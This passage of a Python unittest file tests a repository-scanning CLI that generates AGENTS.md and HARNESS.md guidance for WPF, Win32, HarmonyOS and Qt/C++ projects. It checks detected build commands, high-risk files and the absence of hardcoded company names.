    def test_evidence_command_emits_generic_inventory_and_contract(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "generic-repo"
            repo_root.mkdir()
            (repo_root / "custom.entry").write_text("boot\n", encoding="utf-8")
            buffer = io.StringIO()

            with redirect_stdout(buffer):
                exit_code = main(["evidence", str(repo_root)])

            payload = json.loads(buffer.getvalue())
            self.assertEqual(exit_code, 0)
            self.assertFalse(payload["truncated"])
            self.assertIn("evidence_fingerprint", payload)
            self.assertIn("project_type", payload["analysis_contract"]["claims"])

    def test_scan_generates_constraint_style_agents_for_wpf_native_bridge_repo(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "democlient"
            repo_root.mkdir()
            self.create_native_bridge_repo(repo_root)

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            self.assertIn("项目上下文速查", agents_content)
            self.assertIn("C# + WPF", agents_content)
            self.assertIn("C++/CLI", agents_content)
            # Verify generic dynamic namespace inference (AppClient.Service.* from directory)
            self.assertIn("AppClient.Service", agents_content)
            # Verify generic interface name (AppFramework.Service.IAppService)
            self.assertIn("AppFramework.Service.IAppService", agents_content)
            # Verify native bridge detected by vcxproj (no company-specific name)
            self.assertIn("NativeBridge", agents_content)
            self.assertIn("禁止操作清单", agents_content)
            self.assertIn("NativeBridge/bridge.cpp", agents_content)
            self.assertIn("提问与探索建议", agents_content)
            self.assertIn("自动识别候选", agents_content)
            self.assertIn("需人工确认", agents_content)
            self.assertIn("DllImport", agents_content)
            self.assertIn("MarshalAs", agents_content)
            self.assertIn("Win32 API", agents_content)
            self.assertIn("代码风格锚点", agents_content)
            self.assertIn("AppClient/Service/CallService.cs", agents_content)

            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("自动识别候选", harness_content)
            self.assertIn("需人工确认", harness_content)
            self.assertIn("DllImport", harness_content)

    def test_scan_detects_win32_app_and_avoids_fake_dotnet_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "win32-demo"
            repo_root.mkdir()
            self.create_win32_app_repo(repo_root)

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("Win32", harness_content)
            self.assertNotIn("dotnet build", harness_content)
            self.assertIn("msbuild src/Win32Demo.vcxproj", harness_content)
            self.assertIn("msbuild Win32Demo.sln", harness_content)
            self.assertIn("where msbuild", harness_content)
            self.assertIn("Visual Studio Build Tools", harness_content)

    def test_scan_detects_harmony_project_and_hvigor_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "harmony-demo"
            repo_root.mkdir()
            self.create_harmony_repo(repo_root)

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("Harmony", harness_content)
            self.assertIn("hvigorw assembleHap", harness_content)
            self.assertIn("hvigorw assembleApp", harness_content)
            self.assertIn("- **test**: `device-required`", harness_content)
            # Verify no company-specific package script name leaks into output
            self.assertNotIn("xylink_package.py", harness_content)
            self.assertNotIn("./app_build.sh", harness_content)
            self.assertIn("module.json5", harness_content)

    def test_scan_detects_harmony_packaging_via_generic_pattern(self) -> None:
        """Harmony packaging detection uses *_package.py glob, not a hardcoded name."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "harmony-generic"
            repo_root.mkdir()
            (repo_root / "buildScript").mkdir(parents=True)
            (repo_root / "buildScript" / "app_build.sh").write_text("#!/bin/bash\n", encoding="utf-8")
            # Use a completely different *_package.py name to verify generic matching
            (repo_root / "buildScript" / "myapp_package.py").write_text("print('package')\n", encoding="utf-8")
            (repo_root / "hvigorfile.ts").write_text("export default {};\n", encoding="utf-8")
            (repo_root / "build-profile.json5").write_text("{ app: {} }\n", encoding="utf-8")
            (repo_root / "module.json5").write_text("{ module: {} }\n", encoding="utf-8")

            exit_code = main(["scan", str(repo_root)])
            self.assertEqual(exit_code, 0)
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("Harmony", harness_content)

    def test_scan_detects_qt_windows_client_with_shared_cpp_core(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "qt-cpp-demo"
            repo_root.mkdir()
            self.create_qt_cpp_repo(repo_root)

            exit_code = main(["scan", str(repo_root)])

            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            harness_content = (repo_root / "HARNESS.md").read_text(encoding="utf-8")
            self.assertIn("Qt Client", agents_content)
            self.assertIn("Shared C++ Core", agents_content)
            self.assertIn("Qt UI -> Qt Controller/Service -> C++ wrapper -> Shared C++ Core", agents_content)
            self.assertNotIn("C++/CLI", agents_content)
            self.assertIn("cmake -S . -B build && cmake --build build", harness_content)
            self.assertIn("ctest --test-dir build --output-on-failure", harness_content)
            self.assertIn("shared_cpp/include/core.h", harness_content)
            self.assertIn("C++ 导出头文件或 ABI 边界需人工确认", harness_content)

    def test_scan_sdk_call_chain_infers_namespace_from_path(self) -> None:
        """detect_sdk_call_chain dynamically infers namespace from file path, not hardcoded names."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "generic-wpf"
            repo_root.mkdir()
            (repo_root / "MyApp" / "Services").mkdir(parents=True)
            (repo_root / "MyLib" / "Contracts").mkdir(parents=True)
            (repo_root / "MyApp" / "Services" / "AudioService.cs").write_text(
                "namespace MyApp.Services { class AudioService {} }",
                encoding="utf-8",
            )
            (repo_root / "MyLib" / "Contracts" / "IAudioService.cs").write_text(
                "namespace MyLib.Contracts { public interface IAudioService { void Play(); } }",
                encoding="utf-8",
            )
            (repo_root / "Demo.csproj").write_text(
                "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"><PropertyGroup><UseWPF>true</UseWPF></PropertyGroup></Project>",
                encoding="utf-8",
            )

            exit_code = main(["scan", str(repo_root)])
            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            # Should contain dynamically inferred names, not hardcoded company names
            self.assertNotIn("NemoClient", agents_content)
            self.assertNotIn("NemoFramework", agents_content)
            self.assertNotIn("INemoService", agents_content)
            # Should infer from actual directory/file structure
            self.assertIn("IAudioService", agents_content)

    def test_scan_detect_forbidden_operations_uses_generic_cpp(self) -> None:
        """detect_forbidden_operations finds *.cpp generically, not hardcoded WinXYSDK.cpp."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "wpf-bridge"
            repo_root.mkdir()
            (repo_root / "Bridge").mkdir(parents=True)
            (repo_root / "Bridge" / "native_bridge.cpp").write_text(
                "#include <windows.h>\nvoid Init() {}\n",
                encoding="utf-8",
            )
            (repo_root / "Demo.csproj").write_text(
                "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"><PropertyGroup><UseWPF>true</UseWPF></PropertyGroup></Project>",
                encoding="utf-8",
            )

            exit_code = main(["scan", str(repo_root)])
            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            # Generic .cpp should be detected as high-risk, not only WinXYSDK.cpp
            self.assertIn("native_bridge.cpp", agents_content)
            self.assertNotIn("WinXYSDK", agents_content)

    def test_scan_detect_high_risk_files_uses_generic_interface(self) -> None:
        """detect_high_risk_files finds I*Service.cs generically."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp) / "wpf-generic"
            repo_root.mkdir()
            (repo_root / "Contracts").mkdir(parents=True)
            (repo_root / "Contracts" / "ICallService.cs").write_text(
                "public interface ICallService { void Start(); }",
                encoding="utf-8",
            )
            (repo_root / "Demo.csproj").write_text(
                "<Project Sdk=\"Microsoft.NET.Sdk.WindowsDesktop\"><PropertyGroup><UseWPF>true</UseWPF></PropertyGroup></Project>",
                encoding="utf-8",
            )

            exit_code = main(["scan", str(repo_root)])
            self.assertEqual(exit_code, 0)
            agents_content = (repo_root / "AGENTS.md").read_text(encoding="utf-8")
            # Generic I*Service.cs should be detected as high-risk contract boundary
            self.assertIn("ICallService", agents_content)
            self.assertNotIn("INemoService", agents_content)


if __name__ == "__main__":
    unittest.main()
